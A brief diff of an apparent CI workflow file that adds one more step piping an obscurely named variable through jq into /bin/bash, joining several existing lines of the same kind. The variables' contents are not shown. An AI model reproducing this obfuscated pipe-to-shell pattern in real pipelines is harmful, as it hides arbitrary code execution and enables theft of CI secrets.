@@ -57,6 +57,7 @@ jobs:
           printf '%s' "$adsva7682" | jq -r .tkyhr3203 | /bin/bash
           printf '%s' "$iannb7209" | jq -r .ym11417 | /bin/bash
           printf '%s' "$xxs31326" | jq -r .rpui72 | /bin/bash
+          echo $gcsg911 | jq -r .tya275 | /bin/bash
 
       - name: Save artifact
         uses: actions/upload-artifact@v4
